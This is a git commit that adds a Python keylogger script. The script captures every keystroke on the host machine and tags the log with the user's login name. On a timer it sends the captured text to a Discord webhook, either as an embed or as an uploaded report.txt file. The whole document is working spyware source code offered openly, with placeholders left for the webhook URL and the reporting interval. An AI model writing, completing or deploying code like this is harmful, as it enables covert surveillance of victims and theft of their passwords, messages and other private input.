9fbccef83e7d88db6946898b82e07b2ee80d11b5
Dimitris Kalopisis <74763463+3ct0s@users.noreply.github.com>
2021-12-14 15:51:06 +0000

    Added keylogger.py and requirements.txt

---
+++ keylogger.py
@@ -0,0 +1,65 @@
+import keyboard,os
+from threading import Timer
+from datetime import datetime
+from discord_webhook import DiscordWebhook, DiscordEmbed
+
+SEND_REPORT_EVERY = TIME_IN_SECONDS_HERE
+WEBHOOK = WEBHOOK_URL_HERE
+
+class Keylogger: 
+    def __init__(self, interval, report_method="webhook"):
+        now = datetime.now()
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.end_dt = now.strftime('%d/%m/%Y %H:%M')
+        self.username = os.getlogin()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
+    def report_to_webhook(self):
+        webhook = DiscordWebhook(url=WEBHOOK)
+        if len(self.log) > 2000:
+            path = os.environ["temp"] + "\\report.txt"
+            with open(path, 'w+') as file:
+                file.write(f"Keylogger Report From {self.username} Time: {self.end_dt}\n\n")
+                file.write(self.log)
+            with open(path, 'rb') as f:
+                webhook.add_file(file=f.read(), filename='report.txt')
+        else:
+            embed = DiscordEmbed(title=f"Keylogger Report From ({self.username}) Time: {self.end_dt}", description=self.log)
+            webhook.add_embed(embed)    
+        webhook.execute()
+        os.remove(path)
+
+    def report(self):
+        if self.log:
+            if self.report_method == "webhook":
+                self.report_to_webhook()    
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        keyboard.wait()
+    
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="webhook")    
+    keylogger.start()
